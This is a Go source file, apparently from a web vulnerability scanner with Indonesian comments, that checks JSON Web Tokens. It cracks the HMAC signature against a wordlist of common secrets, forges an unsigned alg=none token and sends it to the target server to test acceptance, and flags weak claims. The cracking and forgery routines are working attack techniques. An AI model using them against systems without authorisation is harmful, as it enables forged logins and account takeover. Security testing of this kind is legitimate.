package agent

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"hash"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/FoxyLoxyland/xyland/internal/engine"
	"github.com/FoxyLoxyland/xyland/internal/store"
	"github.com/FoxyLoxyland/xyland/internal/tools"
	"github.com/FoxyLoxyland/xyland/internal/validate"
)

var jwtRe = regexp.MustCompile(`eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*`)

// daftar secret HMAC yang sangat umum (publik, dari wordlist standar JWT)
var weakSecrets = []string{
	"secret", "secretkey", "secret123", "key", "password", "changeme",
	"jwtsecret", "jwt-secret", "your-secret-key", "your_jwt_secret",
	"mysecret", "my-secret", "supersecret", "s3cret", "s3cr3t",
	"devsecret", "test", "test123", "admin", "default", "secret_key",
	"keyboard cat", "shhhhh", "hush", "qwerty", "123456", "12345678",
	"token", "auth", "signing-key", "signingkey", "jwt", "HS256",
	"Gv2MsqQbsn4kJrT", "please-change-me", "change-me", "secret-key",
	"your-secret", "mysupersecret", "topsecret", "abc123", "letmein",
}

// FindJWT mencari token JWT dari opsi eksplisit, env, atau cookie sesi.
func FindJWT(opts Options) string {
	if opts.JWT != "" {
		return strings.TrimSpace(opts.JWT)
	}
	if v := os.Getenv("XYLAND_JWT"); v != "" {
		return strings.TrimSpace(v)
	}
	for _, c := range []string{opts.AuthA, opts.AuthB} {
		if m := jwtRe.FindString(c); m != "" {
			return m
		}
	}
	return ""
}

type jwtParts struct {
	Header map[string]any
	Claims map[string]any
	Alg    string
	Raw    [3]string
}

func parseJWT(tok string) (*jwtParts, bool) {
	seg := strings.Split(tok, ".")
	if len(seg) != 3 {
		return nil, false
	}
	dec := func(s string) (map[string]any, bool) {
		b, err := base64.RawURLEncoding.DecodeString(s)
		if err != nil {
			return nil, false
		}
		var m map[string]any
		if json.Unmarshal(b, &m) != nil {
			return nil, false
		}
		return m, true
	}
	h, ok1 := dec(seg[0])
	c, ok2 := dec(seg[1])
	if !ok1 || !ok2 {
		return nil, false
	}
	p := &jwtParts{Header: h, Claims: c, Raw: [3]string{seg[0], seg[1], seg[2]}}
	if a, ok := h["alg"].(string); ok {
		p.Alg = a
	}
	return p, true
}

func hmacFor(alg string) func() hash.Hash {
	switch alg {
	case "HS384":
		return sha512.New384
	case "HS512":
		return sha512.New
	default:
		return sha256.New
	}
}

// crackWeakSecret mencoba verifikasi signature terhadap daftar secret umum.
// Ini kriptografi offline murni — pasti benar bila cocok.
func crackWeakSecret(p *jwtParts) string {
	if !strings.HasPrefix(p.Alg, "HS") {
		return ""
	}
	sig, err := base64.RawURLEncoding.DecodeString(p.Raw[2])
	if err != nil {
		return ""
	}
	msg := p.Raw[0] + "." + p.Raw[1]
	for _, s := range weakSecrets {
		mac := hmac.New(hmacFor(p.Alg), []byte(s))
		mac.Write([]byte(msg))
		if hmac.Equal(mac.Sum(nil), sig) {
			return s
		}
	}
	return ""
}

func forgeNone(p *jwtParts) string {
	h := map[string]any{"alg": "none", "typ": p.Header["typ"]}
	hb, _ := json.Marshal(h)
	return base64.RawURLEncoding.EncodeToString(hb) + "." + p.Raw[1] + "."
}

// checkJWT: analisis JWT (knowledge/validation/jwt.yaml).
// Endpoint uji = target scan; operator diarahkan menargetkan endpoint
// terautentikasi agar uji alg=none bermakna.
func checkJWT(ctx context.Context, opts Options, st *store.Store, jobID string) {
	tok := FindJWT(opts)
	if tok == "" {
		return
	}
	p, ok := parseJWT(tok)
	if !ok {
		emit(opts, engine.StateVerdict, "warn", "jwt: token diberikan tapi formatnya tidak valid — dilewati")
		return
	}
	hc := tools.NewClient()
	execID, _ := st.RecordExecution(jobID, "check/jwt", opts.Target, 0, "analisis offline + uji alg=none vs kontrol negatif")
	add := func(title, sev, status, evidence string) {
		_, _ = st.AddFinding(store.Finding{JobID: jobID, Class: "jwt", Title: title, URL: opts.Target, Severity: sev, Status: status, Evidence: evidence, ExecutionID: execID})
		emit(opts, engine.StateVerdict, "verdict", "jwt "+title+" -> "+status)
	}

	// 1) Secret HMAC lemah — verifikasi kriptografis offline (pasti).
	if s := crackWeakSecret(p); s != "" {
		add("JWT HMAC secret lemah", "critical", "confirmed",
			"signature token terverifikasi terhadap secret umum \""+s+"\" (daftar wordlist standar) — siapapun dapat memalsukan token untuk pengguna mana pun, termasuk admin")
	}

	// 2) Uji penerimaan alg=none terhadap endpoint target.
	base, _ := tools.Fetch(ctx, hc, opts.Target) // tanpa auth (kontrol negatif)
	valid, _ := tools.FetchWithHeaders(ctx, hc, opts.Target, map[string]string{"Authorization": "Bearer " + tok})
	noneTok := forgeNone(p)
	noneResp, _ := tools.FetchWithHeaders(ctx, hc, opts.Target, map[string]string{"Authorization": "Bearer " + noneTok})
	if valid != nil && noneResp != nil && base != nil {
		simNV := validate.Similarity(noneResp.Body, valid.Body)
		simNB := validate.Similarity(noneResp.Body, base.Body)
		if noneResp.StatusCode == 200 && valid.StatusCode == 200 && simNV > 0.9 && simNB < 0.5 {
			add("JWT alg=none diterima server", "critical", "confirmed",
				"token tanpa signature (alg=none) memberi respons setara token valid (similarity "+f2(simNV)+") dan berbeda dari kontrol tanpa auth — signature tidak diverifikasi server")
		}
	}

	// 3) Higiene klaim (likely, severity jujur low).
	var issues []string
	exp, hasExp := p.Claims["exp"].(float64)
	iat, hasIat := p.Claims["iat"].(float64)
	if !hasExp {
		issues = append(issues, "tidak ada klaim exp (token tidak kedaluwarsa)")
	} else if hasIat && exp-iat > float64((30*24*time.Hour).Seconds()) {
		issues = append(issues, "masa berlaku token > 30 hari")
	}
	for k := range p.Claims {
		lk := strings.ToLower(k)
		if lk == "password" || lk == "ssn" || lk == "credit_card" || lk == "secret" {
			issues = append(issues, "klaim sensitif di payload: "+k+" (payload JWT hanya ter-encode, bukan terenkripsi)")
		}
	}
	if strings.EqualFold(p.Alg, "none") {
		issues = append(issues, "token asli sendiri sudah ber-alg=none")
	}
	if len(issues) > 0 {
		add("JWT konfigurasi lemah", "low", "likely", strings.Join(issues, "; "))
	}
}
